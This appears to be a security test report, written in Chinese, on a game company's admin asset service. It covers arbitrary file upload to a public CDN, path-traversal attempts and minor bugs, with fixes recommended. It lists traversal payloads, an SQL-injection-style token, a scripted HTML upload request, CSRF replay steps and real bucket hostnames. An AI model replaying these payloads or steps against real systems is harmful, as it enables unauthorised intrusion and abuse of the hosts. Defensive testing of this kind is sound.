---
title: 上传与目录穿越
---

# 安全测试：任意上传与目录穿越

## 结论速览

| 编号 | 问题 | 级别 | 状态 |
|---|---|---|---|
| U-1 | **任意文件类型上传**，落点经 S3 与 CloudFront 匿名可读 | High | 已确认 |
| U-3 | 上传 `subfolder`/`parent` 带穿越 payload 返回 201，落点未出现在 `store/`，是否逃逸**未能证实** | Medium（待定） | 部分确认 |
| T-1 | 目录穿越：`/assets/browse.json?d=` 未能逃出 `store/` 前缀 | — | 已排除 |
| T-2 | 分页 `token` 畸形值触发 500（应 4xx） | Low | 已确认 |
| I-1 | `/assets/browse.json` 泄露 S3 桶地址与 CloudFront 分发域名 | Low | 已确认 |
| D-1 | `/assets/delete` 不校验对象存在性，删除结果不可信 | Low | 已确认 |

---

## U-1 任意文件类型上传（High）

**端点**：`POST /assets/`（multipart，Dropzone 形态）
**前端限制**：`acceptedFiles: "image/*"` —— 纯前端，服务端没有同等校验。

### 实测（全部 201 成功，上传后立即公开可读）

```text
201  HTML 文件 (Content-Type: text/html)             落点 store/qaz2-<run>.html
201  JS  文件 (application/javascript)               落点 store/qaz3-<run>.js
201  SVG 带 onload 脚本 (image/svg+xml)              落点 store/qaz4-<run>.svg
201  TXT (text/plain)                                落点 store/qaz5-<run>.txt
201  HTML 内容 + 伪装 image/png                      落点 store/qaz6-<run>.png
201  基线 PNG（对照）                                 落点 store/qaz1-<run>.png

# 匿名读取验证（不带任何凭证）
store/qaz2-<run>.html   S3 200 / CDN 200
store/qaz3-<run>.js     S3 200 / CDN 200
store/qaz4-<run>.svg    S3 200 / CDN 200
```

### 请求样例

```http
POST /assets/ HTTP/1.1
Host: admin.dev.1939api.com
Cookie: session=<会话>
X-CSRFToken: <从 /assets/ 页面 meta 取>
Content-Type: multipart/form-data; boundary=----X

------X
Content-Disposition: form-data; name="parent"

store
------X
Content-Disposition: form-data; name="subfolder"

------X
Content-Disposition: form-data; name="file"; filename="qaz2-<run>.html"
Content-Type: text/html

<html><body><h1>QA PROBE</h1><script>document.title="PWNED"</script></body></html>
------X--
```

**响应**：`201 Created`，`content-length: 0`。

### 影响

1. 任何能进入后台的人（或拿到后台会话的人）可以向**玩家可见的 CDN** 投放任意文件——钓鱼页、混淆脚本、伪造素材。
2. 对象匿名可读，CDN 未设置 `X-Content-Type-Options: nosniff`。
3. 实测 CDN 对这类对象统一返回 `Content-Type: binary/octet-stream`（无 `Content-Disposition`），浏览器**通常不会内联渲染**，因此**不是可直接利用的存储型 XSS**，但"任意内容托管 + 钓鱼载体"的风险成立。
4. `.png` 里塞 HTML 也能通过，说明类型校验整体缺失。

### 修复建议

- 服务端三重校验：**扩展名白名单 + `Content-Type` + magic bytes** 必须一致（图片类只允许 png/jpg/webp/gif）。
- 服务端重新生成对象名（UUID），不采用客户端提供的文件名。
- 桶策略：仅允许写 `store/` 前缀；上传对象设置正确 `Content-Type`；CDN 增加 `X-Content-Type-Options: nosniff` 与响应头策略。

---

## U-3 上传目录逃逸（Medium，待定）

`subfolder` / `parent` 带入穿越 payload 时服务端**一律 201**，但对象没有出现在 `store/` 列表：

```text
201  subfolder=../           落点=（store/ 列表中未找到）
201  subfolder=../../        落点=（未找到）
201  subfolder=/etc/         落点=（未找到）
201  parent=../              落点=（未找到）
201  parent=other-prefix     落点=（未找到）
```

::: warning 没能证实的部分
S3 匿名请求对"存在 / 不存在"**无区分力**（都返回 403），所以无法在不知道确切规范化规则（已证实文件名会被小写化，`..` 的裁剪规则未知）的情况下穷举出真实 key。
**请服务端自查**：key 拼接时是否 `normpath` 之后仍直接拼接（会让 `store/../x` 变成 `x`），以及是否强校验最终 key 必须以 `store/` 开头。
:::

---

## T-1 目录穿越：未成立

`/assets/browse.json?d=<prefix>` 把 `d` 当 S3 前缀用。实测 16 组 payload：

```text
d=..                 → 与 d=store 相同（服务端归一化）
d=../                → 同上
d=/                  → 同上
d=store/../../       → items=0，crumbs 按字面目录处理
d=store/..%2F..%2Fetc→ items=0
d=store/%2e%2e/%2e%2e→ items=0（未解码成 ..）
d=store/....//....// → items=0
d=store/..%00/       → items=0
d=store/\..\..\      → items=0
```

**没有逃出 `store/` 前缀的证据**，也没有读到其他前缀的内容。分页 `token` 是不透明的 S3 continuation token，无法解析或伪造。

---

## T-2 / I-1 / D-1（Low）

**T-2 畸形 token → 500**（应返回 4xx）：

```text
GET /assets/browse.json?d=store&token=AAAA        → 500
GET /assets/browse.json?d=store&token=../..       → 500
GET /assets/browse.json?d=store&token=%00         → 500
GET /assets/browse.json?d=store&token=' OR '1'='1 → 500
```

**I-1 基础设施信息泄露**（`browse.json` 响应体直接给出）：

```json
{"s3":"https://assets.1939games.com.s3-eu-west-1.amazonaws.com/kards/",
 "cloudfront":"https://d3t4xohaeg8xj9.cloudfront.net/kards/", ...}
```

**D-1 删除接口不校验存在性**：

```text
POST /assets/delete {"keys":["store/__qa-does-not-exist.png"]}
→ 200 {"deleted":["store/__qa-does-not-exist.png"],"message":"Deleted 1 asset(s)"}
POST /assets/delete {"keys":["../../kards/x.png"]} → 400（前缀校验生效，好）
```

好消息是 `../` 与绝对路径被拒；坏消息是不存在的 `store/` key 也报"已删除 1 个"，**删除结果不可信**，运维据此判断会误判。

---

## 附：CSRF 机制（复现写操作必需）

```text
GET  /admin/login  → 隐藏字段 csrf_token + Set-Cookie: session
POST /admin/login  → 同 jar + csrf_token 字段 → 302 /dashboard/
之后每个写请求：GET 页面取 <meta name="csrf-token"> → 以 X-CSRFToken 头发送
```

写请求成功后 session 轮换，旧 token 失效。`/assets/` 页面没有隐藏字段，只能用 meta 值。
